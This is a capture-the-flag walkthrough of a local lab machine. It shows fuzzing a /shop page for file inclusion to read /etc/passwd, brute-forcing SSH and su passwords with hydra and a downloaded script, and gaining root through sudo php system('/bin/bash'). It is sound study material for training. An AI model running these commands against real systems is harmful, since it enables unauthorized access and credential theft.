# ENUMERATION
---

## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22   | ssh     |
| 80   | http    |

Seems like a simple machine in terms of open ports, let's fuzz

## FUZZING
---

![Pasted image 20241226164136.png](../../IMAGES/Pasted%20image%2020241226164136.png)

We found a `/shop` directory, let's visit the standard page and this one:


![Pasted image 20241226164213.png](../../IMAGES/Pasted%20image%2020241226164213.png)

Standard apache2 installation, source code is normal too, let's visit the found directory:

![Pasted image 20241226164307.png](../../IMAGES/Pasted%20image%2020241226164307.png)



# RECONNAISSANCE
---

We found something interesting in the page, this appears right when we enter the site:

![Pasted image 20241226164337.png](../../IMAGES/Pasted%20image%2020241226164337.png)

This seems like the server is vulnerable to [LFI](../../Bug%20Bounty/Vulnerabilities/SERVER%20SIDE%20VULNERABILITIES/FILE%20INCLUSION%20VULNERABILITIES/LOCAL%20FILE%20INCLUSION%20(LFI).md), let's test some payloads to check if its true:


![Pasted image 20241226170019.png](../../IMAGES/Pasted%20image%2020241226170019.png)

After testing for a while, I couldn't get anything useful, so, I thought that we already have the name of the file, it is called `archivo`, so let's fuzz for this in order to find anything useful:


```ad-hint
#### Used
---

`gobuster fuzz -u "http://172.17.0.2/shop?archivo=FUZZ" -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt --exclude-length 1112`

I'm using a different wordlist this time, once used, this is what I found:


It was too big to fit, so, let's try to `grep` for something like the `/etc/passwd` file:


Indeed, it works, I'm able to see some techniques such as a null byte injection and many more, let's read our file, which is located at: `../../../../etc/passwd`



```



# EXPLOITATION
---


We found some interesting usernames such as `manchi` and `seller`, let's try to brute force these usernames in order to get access to ssh:

```ad-hint

### Used
---

`hydra -l manchi -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh -t 10`


We found some credentials, let's log in:



```


Nice, let's proceed with privilege escalation

# PRIVILEGE ESCALATION
---

This is a difficult privilege escalation, after reading another writeup for some sort of hint, I found that the way to escalate privileges is to perform brute force on the other user while being inside of the ssh machine, for this, this script is really helpful:

```ad-hint

#### Escalation

Script: [Linux-Su-Force](https://github.com/Maalfer/Sudo_BruteForce/blob/main/Linux-Su-Force.sh)

We need to get the `rockyou.txt` file and the script into the machine, for this, using scp could help:

`scp /usr/share/wordlists/rockyou.txt manchi@172.17.0.2:/home/manchi/rockyou.txt`

And now the script: 

`scp Linux-Su-Force.sh manchi@172.17.0.2:/home/manchi/Linux-Su-Force.sh`


Once we've download it, let's run the script inside the ssh machine:

`./Linux-Su-Force.sh seller rockyou.txt`


Nice, password was found!

```


Let's switch into `seller`:

![Pasted image 20241226173234.png](../../IMAGES/Pasted%20image%2020241226173234.png)

Now, let's try to escalate into root user:

### sudo -l

![Pasted image 20241226173256.png](../../IMAGES/Pasted%20image%2020241226173256.png)

We can run sudo on `/usr/bin/php`, let's search gtfobins:

![Pasted image 20241226173351.png](../../IMAGES/Pasted%20image%2020241226173351.png)

So, let's escalate into root:

```ad-hint
### Used
---

`CMD="/bin/bash"`
`sudo php -r "system('$CMD');"`



```

Just like that, the CTF is done!



